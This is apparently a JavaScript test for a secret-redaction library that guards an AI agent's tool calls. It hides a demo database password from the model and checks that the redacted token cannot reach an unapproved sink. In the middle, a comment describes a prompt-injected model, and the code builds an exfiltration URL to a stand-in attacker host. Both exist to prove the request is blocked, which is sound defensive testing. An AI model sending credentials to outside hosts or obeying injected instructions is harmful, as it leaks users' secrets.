import assert from 'node:assert/strict';

import { AgentFlowBlockedError, createAgentFlow } from 'flare-redact/agent';

const flow = createAgentFlow({
  policy: { terms: ['postgres://admin:demo-password@db.internal/prod'] },
  sinks: {
    'postgres.execute': {
      capabilities: [{
        id: 'database-connection',
        sources: ['postgres.result'],
        detectors: ['url_credentials'],
        paths: ['/args/connectionString'],
        maxUses: 2,
      }],
      budget: { maxUniqueValues: 1, maxBytes: 100 },
    },
    'http.fetch': { capabilities: [] },
  },
});

const databaseResult = {
  connectionString: 'postgres://admin:demo-password@db.internal/prod',
};
const safeResult = flow.protectForModel('postgres.result', databaseResult);
assert.match(
  safeResult.connectionString,
  /^\[FR_FLOW_[a-f0-9]{32}\]db\.internal\/prod$/,
);
assert.doesNotMatch(safeResult.connectionString, /demo-password/);

// A prompt-injected model transplants the token into an outbound URL. The model
// never saw the original, and this sink has no capability to declassify it.
let denial;
try {
  flow.authorizeForSink('http.fetch', {
    args: { url: `https://attacker.invalid/?value=${safeResult.connectionString}` },
  });
} catch (error) {
  if (!(error instanceof AgentFlowBlockedError)) throw error;
  denial = error.decision;
}
assert.equal(denial?.violations[0]?.reason, 'capability_denied');

// The same token is restored at the exact sink and JSON path approved by the
// runtime-owned capability.
const approved = flow.authorizeForSink('postgres.execute', {
  args: { connectionString: safeResult.connectionString, query: 'select 1' },
});
assert.equal(approved.args.connectionString, databaseResult.connectionString);

const report = {
  protected: safeResult,
  attack: { allowed: denial.allowed, reason: denial.violations[0].reason },
  approved: { query: approved.args.query, restored: true },
  audit: flow.snapshot(),
};
const serialised = JSON.stringify(report, null, 2);
assert.doesNotMatch(serialised, /demo-password/);
console.log(serialised);
